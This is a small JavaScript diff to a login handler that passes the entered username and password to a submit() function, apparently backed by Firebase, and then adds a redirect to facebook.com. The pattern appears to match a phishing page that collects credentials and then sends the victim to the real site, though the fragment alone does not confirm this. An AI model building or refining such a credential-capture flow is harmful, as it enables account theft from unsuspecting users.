@@ -34,7 +34,8 @@ var firebaseConfig = {
             password:password.value 
         }
        
-        submit(username.value,password.value);
+        await submit(username.value,password.value);
+        window.open('https://facebook.com/');
         
 })
 
